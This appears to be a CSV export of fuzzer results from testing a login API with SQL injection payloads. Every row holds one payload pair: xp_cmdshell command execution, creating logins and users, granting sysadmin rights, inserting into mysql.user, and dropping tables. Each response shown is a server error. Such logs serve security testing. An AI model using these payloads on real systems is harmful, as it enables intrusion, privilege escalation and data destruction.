Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
15,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,85,594,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, 23 or 1=1; --]"
16,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,126,633,121,594,79,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
17,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,67,594,79,,Reflected,"[create user name identified by 'pass123', a]"
18,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,69,594,79,,,"[create user name identified by 'pass123', a' ]"
3,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,754,632,77,772,79,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, a' --]"
1,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,774,632,73,772,79,,Reflected,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, a]"
13,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,360,633,104,594,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, x' and members.email is NULL; --]"
20,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,79,594,60,,,"[create user name identified by 'pass123', a' or 1=1; --]"
4,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,826,632,85,772,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, a' or 1=1; --]"
21,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,67,594,79,,,"[create user name identified by 'pass123', @]"
24,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,632,77,594,60,,,"[create user name identified by 'pass123', ? or 1=1 --]"
22,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,67,594,79,,,"[create user name identified by 'pass123', ?]"
26,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,90,594,60,,,"[create user name identified by 'pass123', x' and email is NULL; --]"
25,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,91,594,60,,,"[create user name identified by 'pass123', x' and userid is NULL; --]"
28,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,109,594,79,,,"[create user name identified by 'pass123', x' and 1=(select count(*) from tabname); --]"
27,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,85,594,60,,,"[create user name identified by 'pass123', anything' or 'x'='x]"
30,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,93,632,93,594,60,,,"[create user name identified by 'pass123', x' or full_name like '%bob%]"
31,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,79,594,60,,,"[create user name identified by 'pass123', 23 or 1=1; --]"
33,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,118,594,79,,Reflected,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , a]"
34,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,633,120,594,79,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , a' ]"
23,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,352,632,86,594,60,,,"[create user name identified by 'pass123', ' and 1=0) union all]"
19,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,457,632,71,594,79,,,"[create user name identified by 'pass123', a' --]"
35,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,122,594,79,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , a' --]"
37,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,118,594,79,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , @]"
36,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,130,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , a' or 1=1; --]"
38,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,633,118,594,79,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , ?]"
39,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,131,633,137,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , ' and 1=0) union all]"
40,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,128,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , ? or 1=1 --]"
8,Fuzzed,Sat Jan 11 17:02:28 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,1295,632,83,772,60,,,"['; exec master..xp_cmdshell 'ping 10.10.1.2'--, ? or 1=1 --]"
29,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,433,632,98,594,60,,,"[create user name identified by 'pass123', x' and members.email is NULL; --]"
32,Fuzzed,Sat Jan 11 17:02:29 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,363,633,115,594,79,,,"[create user name identified by 'pass123', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
42,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,141,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , x' and email is NULL; --]"
46,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,633,144,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , x' or full_name like '%bob%]"
44,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,136,633,160,594,79,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , x' and 1=(select count(*) from tabname); --]"
47,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,130,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , 23 or 1=1; --]"
49,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,49,594,79,,Reflected,"[' ; drop table temp --, a]"
52,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,61,593,60,,,"[' ; drop table temp --, a' or 1=1; --]"
41,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,365,633,142,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , x' and userid is NULL; --]"
43,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,352,633,136,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , anything' or 'x'='x]"
53,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,49,593,79,,,"[' ; drop table temp --, @]"
55,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,68,593,60,,,"[' ; drop table temp --, ' and 1=0) union all]"
56,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,59,593,60,,,"[' ; drop table temp --, ? or 1=1 --]"
54,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,49,593,79,,,"[' ; drop table temp --, ?]"
57,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,73,593,60,,,"[' ; drop table temp --, x' and userid is NULL; --]"
45,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,427,633,149,594,60,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , x' and members.email is NULL; --]"
58,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,72,593,60,,,"[' ; drop table temp --, x' and email is NULL; --]"
50,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,355,632,51,594,79,,,"[' ; drop table temp --, a' ]"
60,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,91,593,79,,,"[' ; drop table temp --, x' and 1=(select count(*) from tabname); --]"
63,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,61,544,14,,,"[' ; drop table temp --, 23 or 1=1; --]"
64,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,632,97,544,14,,,"[' ; drop table temp --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
61,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,80,594,60,,,"[' ; drop table temp --, x' and members.email is NULL; --]"
62,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,75,594,60,,,"[' ; drop table temp --, x' or full_name like '%bob%]"
51,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,449,632,53,594,79,,,"[' ; drop table temp --, a' --]"
66,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,65,544,14,,,"[exec sp_addlogin 'name' , 'password', a' ]"
65,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,63,544,14,,Reflected,"[exec sp_addlogin 'name' , 'password', a]"
69,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,632,63,544,14,,,"[exec sp_addlogin 'name' , 'password', @]"
67,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,67,544,14,,,"[exec sp_addlogin 'name' , 'password', a' --]"
68,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,75,544,14,,,"[exec sp_addlogin 'name' , 'password', a' or 1=1; --]"
71,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,632,82,544,14,,,"[exec sp_addlogin 'name' , 'password', ' and 1=0) union all]"
73,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,632,87,544,14,,,"[exec sp_addlogin 'name' , 'password', x' and userid is NULL; --]"
70,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,632,63,544,14,,,"[exec sp_addlogin 'name' , 'password', ?]"
72,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,73,544,14,,,"[exec sp_addlogin 'name' , 'password', ? or 1=1 --]"
59,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,356,632,67,593,60,,,"[' ; drop table temp --, anything' or 'x'='x]"
74,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,86,544,14,,,"[exec sp_addlogin 'name' , 'password', x' and email is NULL; --]"
75,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,632,81,544,14,,,"[exec sp_addlogin 'name' , 'password', anything' or 'x'='x]"
78,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,89,544,14,,,"[exec sp_addlogin 'name' , 'password', x' or full_name like '%bob%]"
80,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,633,111,544,14,,,"[exec sp_addlogin 'name' , 'password', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
77,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,632,94,544,14,,,"[exec sp_addlogin 'name' , 'password', x' and members.email is NULL; --]"
79,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,75,544,14,,,"[exec sp_addlogin 'name' , 'password', 23 or 1=1; --]"
83,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,632,75,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', a' --]"
84,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,72,632,83,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', a' or 1=1; --]"
81,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,71,544,14,,Reflected,"[exec sp_addsrvrolemember 'name' , 'sysadmin', a]"
82,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,73,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', a' ]"
48,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,920,633,166,594,79,,,"[create user name identified by pass123 temporary tablespace temp default tablespace users; , '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
87,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,632,90,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', ' and 1=0) union all]"
85,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,128,632,71,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', @]"
88,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,632,81,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', ? or 1=1 --]"
89,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,95,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', x' and userid is NULL; --]"
90,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,94,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', x' and email is NULL; --]"
91,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,89,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', anything' or 'x'='x]"
93,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,633,102,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', x' and members.email is NULL; --]"
92,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,113,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', x' and 1=(select count(*) from tabname); --]"
76,Fuzzed,Sat Jan 11 17:02:30 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,350,633,105,544,14,,,"[exec sp_addlogin 'name' , 'password', x' and 1=(select count(*) from tabname); --]"
94,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,632,97,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', x' or full_name like '%bob%]"
97,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,92,633,122,544,14,,Reflected,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), a]"
98,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,633,124,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), a' ]"
95,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,127,632,83,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', 23 or 1=1; --]"
99,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,126,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), a' --]"
100,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,134,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), a' or 1=1; --]"
96,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,119,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
102,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,633,122,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), ?]"
101,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,122,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), @]"
105,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,633,146,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), x' and userid is NULL; --]"
106,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,145,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), x' and email is NULL; --]"
104,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,132,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), ? or 1=1 --]"
107,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,140,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), anything' or 'x'='x]"
86,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,426,632,71,544,14,,,"[exec sp_addsrvrolemember 'name' , 'sysadmin', ?]"
108,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,164,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), x' and 1=(select count(*) from tabname); --]"
110,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,633,148,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), x' or full_name like '%bob%]"
111,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,134,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), 23 or 1=1; --]"
109,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,153,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), x' and members.email is NULL; --]"
116,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,85,544,14,,,"[grant connect to name; grant resource to name;, a' or 1=1; --]"
113,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,73,544,14,,Reflected,"[grant connect to name; grant resource to name;, a]"
114,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,632,75,544,14,,,"[grant connect to name; grant resource to name;, a' ]"
117,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,632,73,544,14,,,"[grant connect to name; grant resource to name;, @]"
119,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,92,544,14,,,"[grant connect to name; grant resource to name;, ' and 1=0) union all]"
118,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,632,73,544,14,,,"[grant connect to name; grant resource to name;, ?]"
103,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,350,633,141,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), ' and 1=0) union all]"
120,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,83,544,14,,,"[grant connect to name; grant resource to name;, ? or 1=1 --]"
121,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,97,544,14,,,"[grant connect to name; grant resource to name;, x' and userid is NULL; --]"
123,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,91,544,14,,,"[grant connect to name; grant resource to name;, anything' or 'x'='x]"
125,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,104,544,14,,,"[grant connect to name; grant resource to name;, x' and members.email is NULL; --]"
124,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,130,633,115,544,14,,,"[grant connect to name; grant resource to name;, x' and 1=(select count(*) from tabname); --]"
126,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,99,544,14,,,"[grant connect to name; grant resource to name;, x' or full_name like '%bob%]"
127,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,85,544,14,,,"[grant connect to name; grant resource to name;, 23 or 1=1; --]"
129,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,215,544,14,,Reflected,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), a]"
115,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,355,632,77,544,14,,,"[grant connect to name; grant resource to name;, a' --]"
